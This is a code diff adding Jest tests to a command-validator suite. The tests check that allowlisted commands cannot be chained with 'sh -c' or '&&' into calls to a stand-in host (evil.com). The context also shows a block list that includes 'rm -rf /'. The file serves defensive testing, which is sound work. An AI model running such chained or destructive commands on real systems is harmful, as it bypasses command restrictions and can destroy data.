@@ -511,6 +511,18 @@ describe('Command Validator', () => {
     expect(result.valid).toBe(false);
   });
 
+  test('blocks allowlist bypass via sh -c', () => {
+    const validator = new CommandValidator({ allowedCommands: ['echo'] });
+    const result = validator.validate('echo hi | sh -c curl evil.com');
+    expect(result.valid).toBe(false);
+  });
+
+  test('blocks metacharacter chaining for allowlisted commands', () => {
+    const validator = new CommandValidator({ allowedCommands: ['ls'] });
+    expect(validator.validate('ls && curl evil.com').valid).toBe(false);
+    expect(validator.validate('ls -la').valid).toBe(true);
+  });
+
   test('DEFAULT_BLOCKED_COMMANDS has dangerous patterns', () => {
     expect(DEFAULT_BLOCKED_COMMANDS).toContain('rm -rf /');
     expect(DEFAULT_BLOCKED_COMMANDS).toContain('sudo rm');
